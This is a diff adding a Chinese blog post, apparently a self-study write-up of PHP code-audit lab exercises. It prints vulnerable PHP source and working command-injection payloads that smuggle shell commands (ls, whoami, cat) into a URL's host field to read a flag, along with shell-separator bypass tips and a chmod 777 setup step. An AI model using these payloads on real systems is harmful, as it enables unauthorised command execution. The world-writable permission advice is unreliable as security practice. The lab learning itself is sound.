@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"china-natian.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="对于PHP代码的审计练习,靶场github找的,自学之路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码审计">
+<meta property="og:url" content="http://china-natian.github.io/2023/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="yoki的小书屋">
+<meta property="og:description" content="对于PHP代码的审计练习,靶场github找的,自学之路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117oUerKZ.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117tjsKOF.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117ByNRZS.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117SMuSIZ.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117VPcxty.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Q1G572.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Y8Y4Lk.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117k0w5ge.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117mRlc1d.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117JYtr5l.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117iNBCoP.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117nCoig5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117XdN5fv.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117OC7813.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Maj1gQ.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117mZ3Qqa.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Rrzkiq.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117aw5xBS.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117YV47gD.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117YXz2xP.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Kn3a6b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117sF4fu8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Zlp7WD.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/01178kjrl5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117celzVO.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117XqLQXl.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117EM6j2s.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117JndJVK.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117N5DNfU.png">
+<meta property="article:published_time" content="2023-10-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-17T07:18:43.146Z">
+<meta property="article:author" content="yoki">
+<meta property="article:tag" content="PHP,代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117oUerKZ.png">
+
+
+<link rel="canonical" href="http://china-natian.github.io/2023/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://china-natian.github.io/2023/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","path":"2023/10/15/PHP代码审计/","title":"PHP代码审计"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP代码审计 | yoki的小书屋</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">yoki的小书屋</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">活在当下,及时行乐</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.</span> <span class="nav-text">PHP代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7"><span class="nav-number">1.2.</span> <span class="nav-text">day2-filter_var函数缺陷</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">黑盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.2.</span> <span class="nav-text">白盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day3-%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">day3-实例化任意对象漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">黑盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">白盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day4-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">1.4.</span> <span class="nav-text">day4-弱类型比较</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">黑盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">白盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#day5-escapeshellarg-%E5%92%8C-escapeshellcmd%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.5.</span> <span class="nav-text">day5-escapeshellarg 和 escapeshellcmd注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">黑盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">白盒测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-3"><span class="nav-number">1.5.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Day6"><span class="nav-number">1.6.</span> <span class="nav-text">Day6-</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yoki"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yoki</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/China-natian/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;China-natian&#x2F;" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2385301036@qq.com" title="E-Mail → mailto:2385301036@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://china-natian.github.io/2023/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yoki">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yoki的小书屋">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHP代码审计 | yoki的小书屋">
+      <meta itemprop="description" content="对于PHP代码的审计练习,靶场github找的,自学之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP代码审计
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-15 00:00:00" itemprop="dateCreated datePublished" datetime="2023-10-15T00:00:00+08:00">2023-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-01-17 15:18:43" itemprop="dateModified" datetime="2024-01-17T15:18:43+08:00">2024-01-17</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>19k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>34 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">对于PHP代码的审计练习,靶场github找的,自学之路</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>原项目地址<a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/">hongriSec&#x2F;PHP-Audit-Labs: 一个关于PHP的代码审计项目 (github.com)</a>。此项目有两个问题，一是day1的docker镜像拉取的时候路径有问题，Dockerfile中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM zhhhy/lampp</span><br><span class="line">修改为</span><br><span class="line">FROM zhhhy/lamp</span><br><span class="line">docker命令</span><br><span class="line">docker build xx/xx/ -t xxx:xxx</span><br><span class="line">docker run -dit --name xxx -p xx:80 image-id </span><br></pre></td></tr></table></figure>
+
+<p>但很奇怪的是我在搭建day1时开启docker端口映射的时候无法搭建成功环境，我以为是端口映射的问题，但搭建day2时正常搭建。未解决问题。</p>
+<p>二是环境如果搭建在公网上面需要给文件的权限赋予权限，不然的话有的云服务器会默认600权限，所以要赋予权限。如果发现php文件无法访问，去看看权限问题。我就是之前无法访问，查看日志后才发现是权限的问题，修改权限后正常访问。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117oUerKZ.png" alt="image-20231016165647218"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117tjsKOF.png" alt="image-20231016165731683"></p>
+<h2 id="day2-filter-var函数缺陷"><a href="#day2-filter-var函数缺陷" class="headerlink" title="day2-filter_var函数缺陷"></a>day2-filter_var函数缺陷</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>访问靶场，提示curl一个网站，get方式提交参数url，想着这个地方其实可能存在SSRF，或者是XSS，因为一般的思路就是url传参的地方会有这些漏洞可以。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117ByNRZS.png" alt="image-20231017103505204"></p>
+<p>但是测试后发现他只能curl sec-redclub.com，其他的不行，本来想到xss，于是试着把http改为JavaScript，因为这个可以绕过一些过滤，而且猜测这个url传入后端后会有过滤，比如根据”:&#x2F;&#x2F;“这个来判断是不是url，过滤掉一般的xss的payload，发现写javascript和写http没有区别，于是看看xss的payload能不能执行，发现执行不了。于是只能换思路，想着curl这个应该是系统的命令，想着会不会可以利用这个来执行SSRF，结果想起只能curl sec-redclub.com。于是没有思路了，只能上机白盒审计了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117SMuSIZ.png" alt="image-20231017104121822"></p>
+<h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>打开靶场的shell查看源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">docker exec -<span class="title function_ invoke__">it</span> (容器ID) bash</span><br><span class="line">cat /<span class="keyword">var</span>/www/html/index.php</span><br><span class="line"></span><br><span class="line">root@<span class="number">8</span>b14c494bfb2:/<span class="comment"># cat /var/www/html/index.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; <span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们传入的参数url是get方式进来，判断了url是否为空，并且对url进行了filter_var函数过滤，这个filter_var函数详见菜鸟教程，在这里，就是验证url是不是传入的url格式的字符串，是的话进入if语句，所以继续向下看，发现还有一个if语句，他判断的就是url的host部分是否包含字符串sec-redclub.com，是的话才执行if里面的语句。</p>
+<p>到此重点来了，这个if语句开始执行exec，作为一个正常的安全人员，都知道这个时候，exec肯定会存在问题，所以现在的方向很明确，就是利用exec来进行命令执行，直接拿下服务器的权限。</p>
+<p>来看看过滤，这里的exec其实已经没什么过滤了，直接执行url的host部分，现在要做的就是怎样利用这个url的host来准确的执行我们想要的命令。通过查看exec的官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/ja/function.exec.php">PHP： 执行 - 手动</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec（字符串 $command，数组 &amp;$output = 空，int &amp;$result_code = 空）：字符串|假</span><br></pre></td></tr></table></figure>
+
+<p>当我们传入url参数时，出现了三重判断，是否为空，是否为url格式(filter_var的判断是有缺陷的)，是否以“sec-redclub.com”结尾，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117VPcxty.png" alt="image-20231017154400161"></p>
+<p>因此我们的payload模板就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx://xxxsec-redclub.com</span><br></pre></td></tr></table></figure>
+
+<p>在xxx进行注入，这里根据exec的命令的话，尝试闭合引号来执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当$url=qqq://&quot;|ls;&quot;sec-redclub.com</span><br><span class="line">You have curl &quot;;ls;&quot;sec-redclub.com successfully!</span><br><span class="line">f1agi3hEre.php index.html index.php</span><br><span class="line"></span><br><span class="line">$url=qqq://&quot;;whoami;&quot;sec-redclub.com</span><br><span class="line">You have curl &quot;;whoami;&quot;sec-redclub.com successfully!</span><br><span class="line">www-data</span><br><span class="line"></span><br><span class="line">$url=qqq://&quot;;ls;echo&lt;ppp;&quot;sec-redclub.com</span><br><span class="line">You have curl &quot;;ls;echo</span><br><span class="line">f1agi3hEre.php index.html index.php</span><br><span class="line"></span><br><span class="line">$url=qqq://&quot;;cat&lt;f1agi3hEre.php;&quot;sec-redclub.com</span><br><span class="line">即可获取flag</span><br></pre></td></tr></table></figure>
+
+<p>其中主要有两个需要注意的地方，一是对这个curl执行的代码的时候有一个疑问，他是传递的url的host部分，能看出他其实传递的就是:&#x2F;&#x2F;后面的内容也就是“|ls;”sec-redclub.com,但是他有$site_info前后有“.” ,这个“.”不理解是为什么。第二就是像这种代码执行的地方，一般的思路就是闭合引号，主要是注意当执行带空格的命令时，我们可以使用一些linux的特殊符号来进行绕过，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/liaowenxiong/article/details/113768770">Linux命令行中的特殊符号_特殊字符_在命令行中怎么输入符号_liaowenxiong的博客-CSDN博客</a></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个靶场主要收获就是，filter_var的缺陷，他判断url存在缺陷，导致xxx:&#x2F;&#x2F;xxx均可通过url的验证。然后就是exec函数的漏洞，他可以直接执行系统命令，实际情况中，我们需要绕过带空格的命令时，可以通过linux的特殊字符进行绕过，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;	连续执行，无论是否成功 </span><br><span class="line">|	管道，前面一个命令结果作为后一个命令输入</span><br><span class="line">&lt;	也可以写成0&lt;，标准输入重定向，数据从文件流向处理的命令，例如：命令 &lt; file，命令从file读入</span><br><span class="line">&lt;&lt;	也可以写成0&lt;&lt;，追加输入重定向，追加内容到底部</span><br></pre></td></tr></table></figure>
+
+<h2 id="day3-实例化任意对象漏洞"><a href="#day3-实例化任意对象漏洞" class="headerlink" title="day3-实例化任意对象漏洞"></a>day3-实例化任意对象漏洞</h2><h3 id="黑盒测试-1"><a href="#黑盒测试-1" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>访问主页面为空白<a target="_blank" rel="noopener" href="http://101.42.163.247:9999/index.php%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%80%E8%88%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8Bget%E6%96%B9%E5%BC%8F%E4%BC%A0%E4%B8%AA%E5%8F%82%E6%95%B0%E5%80%BC%EF%BC%8C%E4%BE%8B%E5%A6%82ID=1%EF%BC%8Cnumber=1%EF%BC%8Cname=1%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%88%96%E8%80%85%E6%8A%A5%E9%94%99%EF%BC%8C%E4%BD%86%E6%9C%AC%E6%AC%A1%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E8%BF%94%E5%9B%9E">http://101.42.163.247:9999/index.php，这种情况一般可以尝试一下get方式传个参数值，例如ID=1，number=1，name=1看看有没有回显，或者报错，但本次没有任何返回</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Q1G572.png" alt="image-20231023104421017"></p>
